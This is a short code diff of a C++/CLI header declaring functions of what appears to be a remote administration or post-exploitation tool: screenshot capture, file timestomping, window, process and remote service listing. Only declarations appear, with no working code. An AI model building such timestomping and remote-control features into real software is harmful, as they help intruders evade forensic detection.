@@ -24,7 +24,10 @@ int screenshot(String^ fname);
 //int put(String^ lfile, String^ rfile);
 int timestomp(String^ good, String^ bad);
 void winlist();
-LPCTSTR* servlist();
+void servlist();
+void servlist_remote(String^ comp);
+void serv_remote_active(LPCTSTR com);
+void serv_remote_inactive(LPCTSTR com);
 LPCSTR* proclist();
 
 //Enhanced functions
